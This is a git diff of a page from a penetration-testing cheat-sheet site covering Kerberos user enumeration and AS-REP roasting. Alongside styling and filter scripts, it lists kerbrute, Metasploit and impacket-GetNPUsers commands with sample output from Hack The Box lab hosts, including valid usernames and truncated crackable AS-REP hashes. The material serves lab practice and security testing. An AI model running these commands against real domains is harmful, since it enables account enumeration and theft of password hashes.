@@ -140,15 +140,15 @@
 </header>
 <main>
 <ul class="tagsList single">
-  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
-  <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
+  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
   <li><a href="https://tldrbins.github.io/@kerberoasting/">Kerberoasting</a></li>
   <li><a href="https://tldrbins.github.io/@asreproast/">Asreproast</a></li>
-  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
   <li><a href="https://tldrbins.github.io/@domain-controller/">Domain Controller</a></li>
-  <li><a href="https://tldrbins.github.io/@active-directory/">Active Directory</a></li>
-  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   <li><a href="https://tldrbins.github.io/@getnpusers/">GetNPUsers</a></li>
+  <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
+  <li><a href="https://tldrbins.github.io/@kerberos/">Kerberos</a></li>
+  <li><a href="https://tldrbins.github.io/@rubeus/">Rubeus</a></li>
+  <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -162,7 +162,7 @@
   </ul>
 </div>
   <div id="dynamicFormContainer">
-	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="USER_WITH_DONT_REQUIRE_PREAUTH">USER WITH DONT REQUIRE PREAUTH: </label><input type="text" name="USER_WITH_DONT_REQUIRE_PREAUTH"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="USERS">USERS: </label><input type="text" name="USERS"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
+	<form id="dynamicForm" style="display: none;"><div class="input-group"><label for="DC_IP">DC IP: </label><input type="text" name="DC_IP"></div><div class="input-group"><label for="DC">DC: </label><input type="text" name="DC"></div><div class="input-group"><label for="DOMAIN">DOMAIN: </label><input type="text" name="DOMAIN"></div><div class="input-group"><label for="HASH">HASH: </label><input type="text" name="HASH"></div><div class="input-group"><label for="PASSWORD">PASSWORD: </label><input type="text" name="PASSWORD"></div><div class="input-group"><label for="USER_WITH_NO_PREAUTH">USER WITH NO PREAUTH: </label><input type="text" name="USER_WITH_NO_PREAUTH"></div><div class="input-group"><label for="USER">USER: </label><input type="text" name="USER"></div><div class="input-group"><label for="USERS_FILE">USERS FILE: </label><input type="text" name="USERS_FILE"></div><div class="input-group"><label for="USERS">USERS: </label><input type="text" name="USERS"></div><div class="input-group"><label for="autoReplace">Auto Replace: </label><input type="checkbox" id="autoReplace" name="autoReplace"></div></form>
 	<div class="buttons center">
 		<button id="form_btn">Show Inspector</button>
 		<button id="replace_btn" style="display: none;">Replace Params</button>
@@ -170,14 +170,414 @@
 		<button id="clear_btn" style="display: none;">Clear Cache</button>
 	</div>
 </div>
-  <h3 id="as_rep-roasting">AS_REP Roasting</h3>
+  <style>
+:root{
+   
+  --line:     var(--grey-lighten-4, #e6e6e6);
+  --bg:       var(--grey-lighten-5, #f7f7f7);
+  --fg:       var(--grey, #666);
+  --hover-bg: var(--grey-lighten-4, #ececec);
+  --active-bg: white;
+  --active-fg: var(--primary, #6b46c1);
+
+  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);
+  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);
+  --dm-fg:     #a8a8a8;
+  --dm-hover:  #ae81ff;
+  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);
+  --dm-active-fg: #ae81ff;
+}
+
+ 
+.auth-wrapper {
+  display: flex;
+  justify-content: center;      
+  width: 100%;
+}
+
+.auth-frame {
+  border: 1px solid var(--line);
+  border-radius: 10px;
+  overflow: hidden;
+  width: 100%;
+  max-width: 900px;             
+  background: var(--line);
+  box-sizing: border-box;
+}
+
+ 
+.auth-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr 1fr;
+  grid-template-rows: auto 1fr 1fr;
+  gap: 1px;                     
+  background: transparent;
+  width: 100%;
+  height: 100%;
+}
+
+ 
+.cell {
+  background: var(--bg);
+  min-height: 50px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 0;
+  color: var(--fg);
+  transition: background-color .12s ease, color .12s ease;
+}
+
+ 
+.title {
+  grid-column: 1 / -1;
+  font-weight: 700;
+  font-size: 1.05rem;
+  color: var(--grey-darken-2);
+  background: var(--bg);
+  padding: 10px;
+  text-align: center;
+  user-select: none;         
+  pointer-events: none;      
+}
+
+ 
+.cell-ker {
+  user-select: none;         
+  pointer-events: none;      
+}
+
+ 
+.cell-all    { grid-row: 2 / 4; grid-column: 1; }
+.cell-pw     { grid-row: 2; grid-column: 2; }
+.cell-ntlm   { grid-row: 3; grid-column: 2; }
+.cell-ker    { grid-row: 2; grid-column: 3; }
+.cell-subs   { grid-row: 3; grid-column: 3; }
+
+ 
+.btn {
+  width: 100%;
+  height: 100%;
+  background: transparent;
+  border: none;
+  cursor: pointer;
+  font-weight: 700;
+  font-size: 0.9rem;
+  color: inherit;
+  text-align: center;
+  padding: 12px 8px;
+  box-sizing: border-box;
+}
+
+ 
+.auth-grid .cell:hover:not(.has-subrow) {
+  background: var(--hover-bg);
+  color: var(--active-fg);  
+}
+.auth-grid .cell:has(.btn.active):not(.has-subrow) {
+  background: var(--active-bg);
+  color: var(--active-fg);
+}
+
+ 
+.sub-row {
+  display: flex;
+  width: 100%;
+  height: 100%;
+  gap: 1px;
+  box-sizing: border-box;
+}
+.sub-item {
+  flex: 1;
+  background: var(--bg);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: var(--fg);
+  transition: background .12s ease, color .12s ease;
+}
+.sub-item .btn { width: 100%; height: 100%; }
+
+.sub-item:hover {
+  background: var(--hover-bg);
+  color: var(--active-fg);
+}
+.sub-item:has(.btn.active) {
+  background: var(--active-bg);
+  color: var(--active-fg);
+}
+
+ 
+body.dark-mode .auth-frame {
+  border-color: var(--dm-line);
+  background: var(--dm-line);
+}
+body.dark-mode .cell,
+body.dark-mode .sub-item {
+  background: var(--dm-bg);
+  color: var(--dm-fg);
+}
+body.dark-mode .title {
+  background: var(--dm-bg);
+  color: #d5d5d5;
+}
+
+body.dark-mode .cell:hover:not(.has-subrow) {
+  background: var(--dm-hover);
+  color: var(--dm-active-bg);  
+}
+body.dark-mode .cell:has(.btn.active):not(.has-subrow) {
+  background: var(--dm-active-bg);
+  color: var(--dm-active-fg);
+}
+body.dark-mode .sub-item:hover {
+  background: var(--dm-hover);
+  color: var(--dm-active-bg);
+}
+body.dark-mode .sub-item:has(.btn.active) {
+  background: var(--dm-active-bg);
+  color: var(--dm-active-fg);
+}
+
+ 
+.highlight.active-block pre {
+  border: 1px solid var(--grey-lighten-3);
+  border-radius: 0.2rem;
+}
+
+.highlight.active-block.codeBlock pre:hover,
+.highlight.active-block.codeBlock-start pre:hover,
+.highlight.active-block.codeBlock-end pre:hover {
+  border-color: var(--secondary);
+}
+
+body.dark-mode .highlight.active-block pre {
+  border-color: var(--grey-darken-4);
+}
+
+body.dark-mode .highlight.active-block.codeBlock pre:hover,
+body.dark-mode .highlight.active-block.codeBlock-start pre:hover,
+body.dark-mode .highlight.active-block.codeBlock-end pre:hover {
+  border-color: var(--grey-lighten-1);
+}
+
+ 
+@media (max-width: 768px) {
+  .auth-grid {
+    grid-template-columns: 1fr;
+    grid-template-rows: auto repeat(5, auto);
+  }
+  .cell-all,
+  .cell-pw,
+  .cell-ntlm,
+  .cell-ker,
+  .cell-subs {
+    grid-row: auto;
+    grid-column: 1;
+  }
+  .sub-row { flex-direction: column; }
+}
+</style>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+  const buttons = document.querySelectorAll(".auth-grid .btn");
+  const filters = ["password", "ntlm", "password-based-kerberos", "ntlm-based-kerberos", "ticket-based-kerberos"];
+
+  const filterMap = {
+    password: ["password"],
+    ntlm: ["ntlm"],
+    "kerberos-password": ["password-based-kerberos"],
+    "kerberos-ntlm": ["ntlm-based-kerberos"],
+    "kerberos-ticket": ["ticket-based-kerberos"],
+    all: filters,
+  };
+
+  function filterBlocks(filter) {
+    const targetClasses = filterMap[filter] || [];
+    const authClasses = [
+      "password",
+      "ntlm",
+      "password-based-kerberos",
+      "ntlm-based-kerberos",
+      "ticket-based-kerberos",
+    ];
+    const blocks = [...document.querySelectorAll(".highlight")];
+    const groups = [];
+    let current = [];
+
+    
+    blocks.forEach(block => {
+      current.push(block);
+      const isEnd = block.classList.contains("codeBlock-end");
+      const isStandalone = block.classList.contains("codeBlock-start") && block.classList.contains("codeBlock-end");
+      if (isEnd || isStandalone) {
+        groups.push(current);
+        current = [];
+      }
+    });
+    if (current.length) groups.push(current);
+
+    
+    groups.forEach(group => {
+      const authBlocks = group.filter(b => authClasses.some(c => b.classList.contains(c)));
+      if (!authBlocks.length) return; 
+
+      
+      if (filter === "all") {
+        authBlocks.forEach(b => {
+          b.style.display = "block";
+          b.classList.remove("active-block");
+        });
+        return;
+      }
+
+      
+      const matched = authBlocks.filter(b =>
+        targetClasses.some(tc => b.classList.contains(tc))
+      );
+
+      if (matched.length > 0) {
+        
+        authBlocks.forEach(b => {
+          const visible = matched.includes(b);
+          b.style.display = visible ? "block" : "none";
+          b.classList.toggle("active-block", visible);
+        });
+        return;
+      }
+
+      
+      let fallback = authBlocks.filter(b => b.classList.contains("password"));
+      if (fallback.length === 0) {
+        fallback = authBlocks.filter(b => b.classList.contains("ntlm"));
+      }
+
+      
+      authBlocks.forEach(b => {
+        const visible = fallback.includes(b);
+        b.style.display = visible ? "block" : "none";
+        b.classList.toggle("active-block", visible);
+      });
+    });
+  }
+
+  function setActiveButton(btn) {
+    buttons.forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    const filter = btn.dataset.filter;
+    localStorage.setItem("authFilter", filter);
+    filterBlocks(filter);
+  }
+
+  const saved = localStorage.getItem("authFilter");
+  const initial = saved && filterMap[saved] ? saved : "all";
+  const initBtn = [...buttons].find(b => b.dataset.filter === initial);
+  initBtn ? setActiveButton(initBtn) : filterBlocks("all");
+
+  buttons.forEach(btn => btn.addEventListener("click", () => setActiveButton(btn)));
+});
+</script>
+
+<br>
+
+
+<div class="auth-wrapper">
+  <div class="auth-frame">
+    <div class="auth-grid">
+      <div class="cell title">Authentication Method</div>
+
+      <div class="cell cell-all">
+        <button class="btn" data-filter="all">ALL</button>
+      </div>
+
+      <div class="cell cell-pw">
+        <button class="btn" data-filter="password">PASSWORD</button>
+      </div>
+
+      <div class="cell cell-ntlm">
+        <button class="btn" data-filter="ntlm">NTLM</button>
+      </div>
+
+      <div class="cell cell-ker">
+        <button class="btn" data-filter="kerberos">KERBEROS</button>
+      </div>
+
+      <div class="cell cell-subs has-subrow">
+        <div class="sub-row">
+          <div class="sub-item"><button class="btn" data-filter="kerberos-password">PASSWORD</button></div>
+          <div class="sub-item"><button class="btn" data-filter="kerberos-ntlm">NTLM</button></div>
+          <div class="sub-item"><button class="btn active" data-filter="kerberos-ticket">TICKET</button></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<h3 id="users-enum">Users Enum</h3>
 <p class="tabs">
-<button data-tabset="set1" data-tabcontent="tab1" class="active">Impacket</button>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
-<button data-tabset="set1" data-tabcontent="tab2">nxc</button>
+<button data-tabset="set1" data-tabcontent="tab2">Windows</button>
 
-</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple valid usernames
-</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers <span class="o editable-keyword">&lt;DOMAIN&gt;</span>/ -usersfile <span class="o editable-keyword">&lt;USERS&gt;</span> -no-pass -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
+</p><div class="tabset-wrapper" data-tabset-group="set1"><div class="tabcontent active" data-tabset="set1" data-tabcontent="tab1"><p class="tabs"><button data-tabset="set1-1" data-tabcontent="tab1" class="active">kerbrute</button>
+<button data-tabset="set1-1" data-tabcontent="tab2">metasploit</button></p>
+<div class="tabset-wrapper" data-tabset-group="set1-1"><div class="tabcontent active" data-tabset="set1-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kerbrute userenum --domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span> --dc <span class="o editable-keyword">&lt;DC&gt;</span> <span class="o editable-keyword">&lt;USERS_FILE&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    __             __               __     
+</span></span></span><span class="line"><span class="cl"><span class="go">   / /_____  _____/ /_  _______  __/ /____ 
+</span></span></span><span class="line"><span class="cl"><span class="go">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+</span></span></span><span class="line"><span class="cl"><span class="go"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span></span><span class="line"><span class="cl"><span class="go">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">2024/09/24 14:54:41 &gt;  Using KDC(s):
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;   dc.absolute.htb:88
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       j.roberts@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       m.chaffrey@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       s.osvald@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       d.klay@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       j.robinson@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       n.smith@absolute.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:42 &gt;  Done! Tested 88 usernames (6 valid) in 0.491 seconds
+</span></span></span></div></pre></div><p><small><em>Ref: <a href="https://github.com/ropnop/kerbrute">kerbrute</a></em></small></p></div><div class="tabcontent" data-tabset="set1-1" data-tabcontent="tab2"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use auxiliary/gather/kerberos_enumusers
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set user_file <span class="o editable-keyword">&lt;USERS_FILE&gt;</span>
+</span></span></span><span class="line"><span class="cl"><span class="go">set rhosts <span class="o editable-keyword">&lt;DC&gt;</span>
+</span></span></span><span class="line"><span class="cl"><span class="go">set domain <span class="o editable-keyword">&lt;DOMAIN&gt;</span>
+</span></span></span><span class="line"><span class="cl"><span class="go">run
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="go">msf6 auxiliary(gather/kerberos_enumusers) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using domain: DANTE - 172.16.2.1:88        ...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 172.16.2.1 - User: "user1" user not found
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 172.16.2.1 - User: "user2" user not found
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 172.16.2.1 - User: "user3" user not found
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] 172.16.2.1 - User: "user4" does not require preauthentication. Hash: $krb5asrep$23$ ---[SNIP]--- 9161d63be1
+</span></span></span><span class="line"><span class="cl"><span class="go">---[SNIP]---
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Auxiliary module execution completed
+</span></span></span></div></pre></div></div></div>
+
+</div><div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">TO-DO
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
+
+<p></p>
+<hr>
+<h3 id="as_rep-roasting">AS_REP Roasting</h3>
+<p class="tabs">
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set2" data-tabcontent="tab2">Windows</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set2"><div class="tabcontent active" data-tabset="set2" data-tabcontent="tab1"><p class="tabs"><button data-tabset="set2-1" data-tabcontent="tab1" class="active">impacket</button>
+<button data-tabset="set2-1" data-tabcontent="tab2">nxc</button></p>
+<div class="tabset-wrapper" data-tabset-group="set2-1"><div class="tabcontent active" data-tabset="set2-1" data-tabcontent="tab1"><div class="highlight codeBlock-start"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple users
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/' -usersfile <span class="o editable-keyword">&lt;USERS&gt;</span> -no-pass -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
@@ -188,51 +588,52 @@
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5asrep<span class="nv">$23$d</span>.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea<span class="nv">$7288</span>c91ca ---<span class="o">[</span>SNIP<span class="o">]</span>--- 0e09c5d9d1
 </span></span><span class="line"><span class="cl"><span class="go">[-] User j.robinson doesn't have UF_DONT_REQUIRE_PREAUTH set
 </span></span></span><span class="line"><span class="cl"><span class="go">[-] User n.smith doesn't have UF_DONT_REQUIRE_PREAUTH set
-</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Single user without creds
-</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers -no-pass -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span> '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>'
+</span></span></span></div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Single user
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers '<span class="o editable-keyword">&lt;DOMAIN&gt;</span>/<span class="o editable-keyword">&lt;USER&gt;</span>' -no-pass -dc-ip <span class="o editable-keyword">&lt;DC_IP&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
 <span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers -no-pass -dc-ip 10.10.11.181 ABSOLUTE.HTB/d.klay
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting TGT for d.klay
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5asrep<span class="nv">$23$d</span>.klay@ABSOLUTE.HTB:97c9a3ec7b550c29bc52f0c176738e73<span class="nv">$ab25b07d4</span> ---<span class="o">[</span>SNIP<span class="o">]</span>--- 78a8e52bb6
